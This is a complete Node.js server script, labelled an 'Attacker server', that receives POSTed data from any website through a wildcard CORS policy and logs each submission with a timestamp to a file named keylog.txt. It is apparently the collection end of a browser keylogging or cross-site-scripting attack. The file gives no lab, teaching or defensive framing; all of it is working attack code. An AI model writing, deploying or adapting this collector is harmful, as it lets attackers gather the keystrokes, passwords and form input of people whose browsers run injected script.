const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4000;
const LOG_FILE = path.resolve(__dirname, 'keylog.txt');

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method !== 'POST') {
    res.writeHead(404);
    res.end();
    return;
  }

  let body = '';

  req.on('data', (chunk) => {
    body += chunk;
  });

  req.on('end', () => {
    const line = `${new Date().toISOString()} ${body}\n`;

    fs.appendFile(LOG_FILE, line, (error) => {
      if (error) {
        res.writeHead(500);
        res.end('failed to write log');
        return;
      }

      res.writeHead(200);
      res.end('ok');
    });
  });
});

server.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
});